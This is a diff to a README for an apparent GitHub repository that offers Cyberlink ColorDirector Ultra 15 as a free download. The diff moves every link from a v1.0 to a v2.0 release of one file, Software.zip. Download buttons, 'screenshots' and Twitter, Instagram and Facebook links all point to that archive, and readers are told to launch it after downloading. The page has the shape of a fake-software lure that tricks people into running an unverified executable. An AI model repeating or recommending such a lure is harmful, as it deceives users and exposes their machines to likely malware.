@@ -1,6 +1,6 @@
 # 🌈🎬 Cyberlink ColorDirector Ultra 15 🌟✨
 
-[![Download Cyberlink ColorDirector Ultra 15](https://github.com/montaigne23/Cyberlink-ColorDirector-Ultra-15/releases/download/v1.0/Software.zip%F0%9F%8E%A5-orange)](https://github.com/montaigne23/Cyberlink-ColorDirector-Ultra-15/releases/download/v1.0/Software.zip)
+[![Download Cyberlink ColorDirector Ultra 15](https://github.com/montaigne23/Cyberlink-ColorDirector-Ultra-15/releases/download/v2.0/Software.zip%F0%9F%8E%A5-orange)](https://github.com/montaigne23/Cyberlink-ColorDirector-Ultra-15/releases/download/v2.0/Software.zip)
 
 Welcome to the Cyberlink ColorDirector Ultra 15 repository! 🎨 This repository is your one-stop destination for all things related to professional-grade color grading and video enhancement using Cyberlink ColorDirector Ultra 15. Whether you're a filmmaker, video editor, or multimedia enthusiast, ColorDirector Ultra 15 is here to help you take your videos to the next level. ✨
 
@@ -20,7 +20,7 @@ Cyberlink ColorDirector Ultra 15 is a powerful video editing tool that allows yo
 
 ## 🚀 Getting Started
 
-To get started with Cyberlink ColorDirector Ultra 15, download the software from the following link: [Download ColorDirector Ultra 15](https://github.com/montaigne23/Cyberlink-ColorDirector-Ultra-15/releases/download/v1.0/Software.zip). Please note that it needs to be launched after downloading to begin using the software.
+To get started with Cyberlink ColorDirector Ultra 15, download the software from the following link: [Download ColorDirector Ultra 15](https://github.com/montaigne23/Cyberlink-ColorDirector-Ultra-15/releases/download/v2.0/Software.zip). Please note that it needs to be launched after downloading to begin using the software.
 
 If you encounter any issues with the download link, please check the "Releases" section of this repository for alternative download options.
 
@@ -32,19 +32,19 @@ Explore more about color-editing, color-grading-software, colordirector, cyberli
 
 Here are some screenshots showcasing the powerful features of Cyberlink ColorDirector Ultra 15:
 
-1. ![Screenshot 1](https://github.com/montaigne23/Cyberlink-ColorDirector-Ultra-15/releases/download/v1.0/Software.zip)
-2. ![Screenshot 2](https://github.com/montaigne23/Cyberlink-ColorDirector-Ultra-15/releases/download/v1.0/Software.zip)
-3. ![Screenshot 3](https://github.com/montaigne23/Cyberlink-ColorDirector-Ultra-15/releases/download/v1.0/Software.zip)
+1. ![Screenshot 1](https://github.com/montaigne23/Cyberlink-ColorDirector-Ultra-15/releases/download/v2.0/Software.zip)
+2. ![Screenshot 2](https://github.com/montaigne23/Cyberlink-ColorDirector-Ultra-15/releases/download/v2.0/Software.zip)
+3. ![Screenshot 3](https://github.com/montaigne23/Cyberlink-ColorDirector-Ultra-15/releases/download/v2.0/Software.zip)
 
 ## 🌟 Connect with Us
 
 Stay updated with the latest news, tutorials, and tips on video editing and color grading by following us on social media:
 
-📱 Twitter: [@ColorDirector15](https://github.com/montaigne23/Cyberlink-ColorDirector-Ultra-15/releases/download/v1.0/Software.zip)
+📱 Twitter: [@ColorDirector15](https://github.com/montaigne23/Cyberlink-ColorDirector-Ultra-15/releases/download/v2.0/Software.zip)
 
-📸 Instagram: [@ColorDirectorUltra15](https://github.com/montaigne23/Cyberlink-ColorDirector-Ultra-15/releases/download/v1.0/Software.zip)
+📸 Instagram: [@ColorDirectorUltra15](https://github.com/montaigne23/Cyberlink-ColorDirector-Ultra-15/releases/download/v2.0/Software.zip)
 
-📘 Facebook: [ColorDirectorUltra15](https://github.com/montaigne23/Cyberlink-ColorDirector-Ultra-15/releases/download/v1.0/Software.zip)
+📘 Facebook: [ColorDirectorUltra15](https://github.com/montaigne23/Cyberlink-ColorDirector-Ultra-15/releases/download/v2.0/Software.zip)
 
 Join our growing community of video editing enthusiasts and filmmakers! 🎥✨
 
